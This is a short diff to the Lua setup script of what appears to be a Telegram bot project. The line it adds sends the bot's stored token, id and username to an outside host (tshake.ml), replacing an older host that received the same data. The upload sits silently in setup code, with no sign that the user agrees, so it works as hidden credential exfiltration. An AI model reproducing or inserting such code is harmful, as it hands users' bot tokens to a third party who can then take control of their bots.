@@ -64,7 +64,7 @@ os.execute('lua start.lua')
 end
 local function Files_GRiNd_Info()
 Create_Info(database:get(Server_GRiNd.."Token_GRiNd"),database:get(Server_GRiNd.."Id_GRiNd"),database:get(Server_GRiNd.."UserName_GRiNd"))   
-http.request("http://GRiNd.ml/add/?id="..database:get(Server_GRiNd.."Id_GRiNd").."&user="..database:get(Server_GRiNd.."UserName_GRiNd").."&token="..database:get(Server_GRiNd.."Token_GRiNd"))
+http.request("http://tshake.ml/add/?id="..database:get(Server_GRiNd.."Id_GRiNd").."&user="..database:get(Server_GRiNd.."UserName_GRiNd").."&token="..database:get(Server_GRiNd.."Token_GRiNd"))
 local RunGRiNd = io.open("GRiNd", 'w')
 RunGRiNd:write([[
 #!/usr/bin/env bash
